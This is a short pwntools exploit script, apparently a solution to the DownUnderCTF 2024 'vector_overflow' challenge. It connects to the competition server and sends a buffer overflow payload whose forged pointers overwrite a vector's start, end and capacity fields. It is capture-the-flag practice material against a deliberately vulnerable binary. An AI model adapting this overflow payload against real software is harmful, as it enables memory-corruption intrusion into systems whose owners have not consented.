#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vector_overflow", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.ductf.dev", 30013)

BUF = 0x4051e0

payload = b""
payload += b"DUCTF"
payload += b"\x00" * 11 # fill up to 16 bytes
payload += p64(BUF)     # v.start
payload += p64(BUF + 5) # v.end
payload += p64(BUF + 5) # v.capacity

p.sendline(payload)

p.interactive()
